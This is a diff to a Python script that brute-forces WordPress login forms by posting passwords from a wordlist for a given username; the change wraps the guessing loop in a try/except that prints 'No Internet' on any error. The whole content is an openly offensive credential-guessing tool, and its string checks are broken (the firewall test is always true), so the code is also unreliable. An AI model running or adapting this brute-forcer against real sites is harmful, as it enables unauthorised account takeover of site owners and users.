@@ -26,24 +26,27 @@ except IOError:
     sys.exit(1)
 
 def Brute(target, wlist):
-    s = requests.Session()
-    for password in passwords:
-        fodata = {'log': sys.argv[2],'pwd': password}
-        response = s.post(target, data=fodata)
-        global number
-        number += str(1)
-        print("[*] Trying Password#" + number + ": " + password)
+    try:
+        s = requests.Session()
+        for password in passwords:
+            fodata = {'log': sys.argv[2],'pwd': password}
+            response = s.post(target, data=fodata)
+            global number
+            number += str(1)
+            print("[*] Trying Password#" + number + ": " + password)
 
-        if "The firewall on this server is blocking your connection" or "firewall" or "block" or "blocked" or "robot" or "unauthorised" in response.text:
-            print("[-] The Firewall Blocked Your IP")
-            sys.exit(0)
+            if "The firewall on this server is blocking your connection" or "firewall" or "block" or "blocked" or "robot" or "unauthorised" in response.text:
+                print("[-] The Firewall Blocked Your IP")
+                sys.exit(0)
 
-        if "The password you entered for the username" and "firewall" and "block" and "blocked" and "robot" and "unauthorised" and "The firewall on this server is blocking your connection" not in response.text:
-            print()
-            print('[+] Password Found: '+ password)
-            pwd = "1"
-            sys.exit(0)
-    
+            if "The password you entered for the username" and "firewall" and "block" and "blocked" and "robot" and "unauthorised" and "The firewall on this server is blocking your connection" not in response.text:
+                print()
+                print('[+] Password Found: '+ password)
+                pwd = "1"
+                sys.exit(0)
+    except:
+        print("[-] Error: No Internet")
+        sys.exit(0)
 try:
     thread = threading.Thread(target = Brute, args = (sys.argv[1], sys.argv[3],))
     thread.start()
